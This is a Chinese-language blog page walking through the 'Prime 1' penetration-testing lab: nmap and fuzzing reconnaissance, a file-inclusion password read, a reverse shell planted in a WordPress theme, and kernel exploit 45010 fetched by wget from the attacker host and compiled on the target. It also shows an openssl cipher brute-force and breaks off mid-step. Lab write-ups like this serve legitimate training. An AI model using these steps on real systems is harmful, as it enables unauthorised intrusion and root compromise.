@@ -1,0 +1,421 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>d3mXBu7 の Blog | d3mXBu7 の Blog</title><meta name="author" content="d3mXBu7"><meta name="copyright" content="d3mXBu7"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Prime 1   信息收集1.namp扫描主机探测1nmap -sn 192.168.144.0&#x2F;24   端口扫描12sudo nmap -min-rate 10000 -p- 192.168.144.131  发现开放了22和80端口  TCP,UDP扫描1234567sudo nmap -sT -sV -O -p22,80 192.168.144.131-sV 对端口上的服务程序版本进行扫">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3mXBu7 の Blog">
+<meta property="og:url" content="https://d3mxbu7.github.io/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/index.html">
+<meta property="og:site_name" content="d3mXBu7 の Blog">
+<meta property="og:description" content="Prime 1   信息收集1.namp扫描主机探测1nmap -sn 192.168.144.0&#x2F;24   端口扫描12sudo nmap -min-rate 10000 -p- 192.168.144.131  发现开放了22和80端口  TCP,UDP扫描1234567sudo nmap -sT -sV -O -p22,80 192.168.144.131-sV 对端口上的服务程序版本进行扫">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg">
+<meta property="article:published_time" content="2024-04-22T07:16:41.873Z">
+<meta property="article:modified_time" content="2024-04-22T07:17:00.447Z">
+<meta property="article:author" content="d3mXBu7">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg"><link rel="shortcut icon" href="/favicon_ph/favicon.jpg"><link rel="canonical" href="https://d3mxbu7.github.io/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'd3mXBu7 の Blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-22 15:17:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="../public/css/font.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="d3mXBu7 の Blog"><span class="site-name">d3mXBu7 の Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-22T07:16:41.873Z" title="发表于 2024-04-22 15:16:41">2024-04-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-22T07:17:00.447Z" title="更新于 2024-04-22 15:17:00">2024-04-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 align ="center">Prime 1</h1>
+
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-namp扫描"><a href="#1-namp扫描" class="headerlink" title="1.namp扫描"></a>1.namp扫描</h2><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029112.png" alt="image-20240416002900036"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -min-rate 10000 -p- 192.168.144.131</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现开放了22和80端口</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160029493.png" alt="image-20240416002935434"></p>
+<h3 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP,UDP扫描"></a>TCP,UDP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,80 192.168.144.131</span><br><span class="line">-sV 对端口上的服务程序版本进行扫描</span><br><span class="line">-O 对目标主机的操作系统进行扫描</span><br><span class="line">-sT TCP连接扫描</span><br><span class="line"></span><br><span class="line">sudo nmap -sU -p22,80 192.168.144.131</span><br><span class="line">-sU 对UDP进行扫描</span><br></pre></td></tr></table></figure>
+
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036713.png" alt="image-20240416003619656" style="zoom:50%;" />
+
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160036094.png" alt="image-20240416003627060" style="zoom:50%;" />
+
+<h3 id="脚本漏洞扫描，为我们渗透提供初步思路"><a href="#脚本漏洞扫描，为我们渗透提供初步思路" class="headerlink" title="脚本漏洞扫描，为我们渗透提供初步思路"></a>脚本漏洞扫描，为我们渗透提供初步思路</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,80 192.168.144.131</span><br></pre></td></tr></table></figure>
+
+<p>得到了一个cve以及一个wordpress网站的登陆页</p>
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160046864.png" alt="image-20240416004617795" style="zoom:50%;" />
+
+<h1 id="WEB端攻击"><a href="#WEB端攻击" class="headerlink" title="WEB端攻击"></a>WEB端攻击</h1><ul>
+<li>访问80端口并没有什么有用信息，于是进行FUZZ</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.144.131 -o DirbReport.txt</span><br></pre></td></tr></table></figure>
+
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160100528.png" alt="image-20240416010024433" style="zoom:50%;" />
+
+<ul>
+<li>查看dev文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.144.131/dev</span><br></pre></td></tr></table></figure>
+
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160101883.png" alt="image-20240416010151831" style="zoom:50%;" />
+
+<ul>
+<li>限定扩展名，特定搜索,因为很多有信息的文件可能是txt,html,ph 或者zip</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dirb http://192.168.144.131 -X .txt,.php,.html</span><br></pre></td></tr></table></figure>
+
+<p>发现了secret文件</p>
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160104483.png" alt="image-20240416010420435" style="zoom:50%;" />
+
+<p>访问secret文件，其中比较重要的是<code>https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web看到location.txt，你就会得到你的下一步行动</code></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404160105237.png" alt="image-20240416010513194"></p>
+<ul>
+<li>接着使用提示到得wfuzz工具对PHP文件进行FUZZ</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hh 136 http://192.168.144.131/index.php?FUZZ=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161145749.png" alt="image-20240416114558671"></p>
+<ul>
+<li>找到参数file，但我们并没有找到location.txt文件，所有我们可以尝试文件包含location.txt文件</li>
+</ul>
+<p>回显是<code>在其他一些 php 页面上使用“secrettier360”参数以获得更多乐趣</code></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161147416.png" alt="image-20240416114753356"></p>
+<ul>
+<li>在image.php页面上访问参数&#96;&#96;secrettier360&#96;</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161151671.png" alt="image-20240416115151626"></p>
+<ul>
+<li>到这一步知道了参数可以尝试使用文件包含</li>
+</ul>
+<p>其中知道了1.victor用户用于bash  2.saket在他的目录下可以发现password文件</p>
+<img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161156830.png" alt="image-20240416115611754" style="zoom:50%;" />
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161157302.png" alt="image-20240416115749270"></p>
+<ul>
+<li>既然知道了saket的路劲直接访问读取密码—follow_the_ippsec</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161204110.png" alt="image-20240416120412058"></p>
+<ul>
+<li>尝试使用账号密码登录ssh以及WordPress后台</li>
+</ul>
+<p>ssh登录失败</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161211057.png" alt="image-20240416121123006"></p>
+<p>使用saket用户后台登录失败，但是使用victor用户成功</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161213786.png" alt="image-20240416121344723"></p>
+<img src="C:\Users\But\AppData\Roaming\Typora\typora-user-images\image-20240416135416751.png" alt="image-20240416135416751" style="zoom: 50%;" />
+
+<ul>
+<li>接着在后台的wordpress寻找突破口，尝试上传文件，找一个个功能点以及接口，看看有没有文件上传或者可写的地方</li>
+</ul>
+<p>写入一句话反弹shell，刷新使用主题的路径<code>http://192.168.144.131/wordpress/wp-content/themes/twentynineteen/secret.php</code>触犯一句话</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161407101.png" alt="image-20240416140711025"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161410871.png" alt="image-20240416141013834"></p>
+<h2 id="主机提权-解法一内核提权"><a href="#主机提权-解法一内核提权" class="headerlink" title="主机提权(解法一内核提权)"></a>主机提权(解法一内核提权)</h2><ul>
+<li>查看主机权限,信息收集</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">whoami</span><br><span class="line">uname -a uname命令：主要用于输出一组操作系统的信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161415174.png" alt="image-20240416141520074"></p>
+<ul>
+<li>内核版本比较低,查看看看有没有漏洞提权使用searchsploit工具</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu 4.10.0-28</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161418437.png" alt="image-20240416141829398"></p>
+<ul>
+<li>利用历史漏洞尝试提权</li>
+</ul>
+<p>利用第二个方法提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Linux ubuntu -m 45010</span><br></pre></td></tr></table></figure>
+
+<p>这个文件是一个C语言编写的文件需要C语言编译</p>
+<p><em>注意:由于不同环境gcc编译后的文件是不同的，这里我们应该把45010.c上传到靶机环境中再在靶机中进行编译。如果靶机中没有gcc，那再考虑搭建靶机环境，或者本地编译再上传</em></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161432274.png" alt="image-20240416143258222"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161434413.png" alt="image-20240416143405314"></p>
+<p>本地起一个http服务,让目标机器wegt这个.c文件然后再编译(先上传到服务器再编译)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161437219.png" alt="image-20240416143723153"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.144.132/45010.c</span><br></pre></td></tr></table></figure>
+
+<p>发现当前目录是没有写入的权限的</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161443460.png" alt="image-20240416144319419"></p>
+<p>查看哪个目录有写入权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lish</span><br></pre></td></tr></table></figure>
+
+<p>发现tmp文件夹有写入权限</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161446193.png" alt="image-20240416144643110"></p>
+<p>进入tmp目录再wget下来.c文件然后编译</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161450169.png" alt="image-20240416145003118"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.尝试编译</span><br><span class="line"> </span><br><span class="line">gcc 45010.c -o getRoot</span><br><span class="line"> </span><br><span class="line">2.添加执行权限</span><br><span class="line"> </span><br><span class="line">chmod +x getRoot</span><br><span class="line"> </span><br><span class="line">3.运行</span><br><span class="line"></span><br><span class="line">./getRoot </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161501742.png" alt="image-20240416150113680"></p>
+<p>提权成功，但表示完整的交互，看看是否有python,并且使用python完善交互环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l 看看有什么软件包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161503163.png" alt="image-20240416150356069"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161507438.png" alt="image-20240416150754392"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161506045.png" alt="image-20240416150647011"></p>
+<p>靶机基本拿下了</p>
+<h2 id="主机提权（方法二OpenSSL解密）"><a href="#主机提权（方法二OpenSSL解密）" class="headerlink" title="主机提权（方法二OpenSSL解密）"></a>主机提权（方法二OpenSSL解密）</h2><blockquote>
+<p>sudo -l 查看当前用户有哪些权限，发现当前用户能不用root 密码运行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=enc&spm=1001.2101.3001.7020">enc</a>文件，看见enc文件猜测存在openssl加密</p>
+</blockquote>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161928423.png" alt="image-20240416192816338"></p>
+<h3 id="ENC探索和查找"><a href="#ENC探索和查找" class="headerlink" title="ENC探索和查找"></a>ENC探索和查找</h3><p>发现是一个可执行文件,但是密码目前不知道</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161931868.png" alt="image-20240416193151819"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161933917.png" alt="image-20240416193337861"></p>
+<ul>
+<li>查找密码,查找备份文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*backup*&quot;</span><br><span class="line">find / -name “*passwd*”</span><br><span class="line">find / -name “*password*”</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null</span><br><span class="line">find / -name &quot;*backup*&quot;  2&gt;/dev/null | sort | less</span><br><span class="line">(有很多信息，其中大部分都是Permission denied 这是报错Permission denied（权限不允许），这种信息是没意义的，干脆把他丢弃掉，用2&gt;/dev/null过滤：)</span><br></pre></td></tr></table></figure>
+
+<p>会返回很多信息其中找到几个比较有价值的,排除掉再help目录或者modlues目录下面的.例如&#x2F;opt&#x2F;backup,&#x2F;opt&#x2F;back&#x2F;server_database&#x2F;backup_pass等等</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940373.png" alt="image-20240416194013265"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161940182.png" alt="image-20240416194052097"></p>
+<p>查看这几个可疑文件,找到关键信息</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161943365.png" alt="image-20240416194349317"></p>
+<p>运行enc文件之后得到了几个新的东西</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161947164.png" alt="image-20240416194706103"></p>
+<ul>
+<li>enc破解利用</li>
+</ul>
+<p>得到一个密文和一个密钥,其中根据提示我们可以知道md5的密钥</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404161948613.png" alt="image-20240416194855549"></p>
+<ul>
+<li>加密MD5</li>
+</ul>
+<p>接下来md5加密得到密钥,这里一个小细节就是MD5加密的时候要使用-n参数,因为在终端用echo输出会再后面加一个&#x2F;n字符,我们需要去掉.awk是对字符串进行处理的一个工具，<code>awk -F &#39; &#39; &#39;&#123;print $1;&#125;&#39;</code>意思是以空格为分割，打印其中第一个部分，这样就会只输出366a74cb3c959de17d61db30591c39d1 后面的‘-’不会输出 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;ippsec&#x27; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>openssl破解</li>
+</ul>
+<p>openssl enc的使用,现在需要密文,密钥,加解密方式,加解密方式是不知道的.我们只是大概知道可能是base64加密,另外-k参数输入密钥需要16进制的形式</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162020058.png" alt="image-20240416201722016"></p>
+<p>先处理k参数输入16进制的参数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; | od -A n -t x1(这个命令会存在后面带一个oa)</span><br><span class="line">使用tr –d  ‘\n’去掉换行符 </span><br><span class="line">echo -n &quot;ippsec&quot; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1;&#125;&#x27; |tr -d &#x27;\n&#x27;| od -A n -t x1 | tr -d  &#x27; &#x27; | tr -d  &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162043244.png" alt="image-20240416204305186"></p>
+<p>处理解密方式,因为有很多解密的方式我们需要遍历,利用bash命令实现对其的遍历</p>
+<p>首先是把所有的方法都保存在CipherTypeRaw文件里面</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;&#123;gsub(/ /,&quot;\n&quot;);print&#125;&#x27; CipherTypeRaw | sort | uniq &gt; CipherTypes</span><br><span class="line">加上sort是让每一行变得紧密,uniq每行的重复字符删去(删除多余的换行)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162108053.png" alt="image-20240416210839976"></p>
+<p>使用bash命令遍历</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for cipher in $(cat CipherTypes);do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到的是aes-256-ecb加密,密码是”tribute_to_ippsec”,还有一个Victor的落款</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162127587.png" alt="image-20240416212735508"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162128353.png" alt="image-20240416212855286"></p>
+<ul>
+<li>ssh连接提权</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162137965.png" alt="image-20240416213716870"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162138882.png" alt="image-20240416213826831"></p>
+<p>按照提示运行相关文件,发现缺少challenge,按照提示来</p>
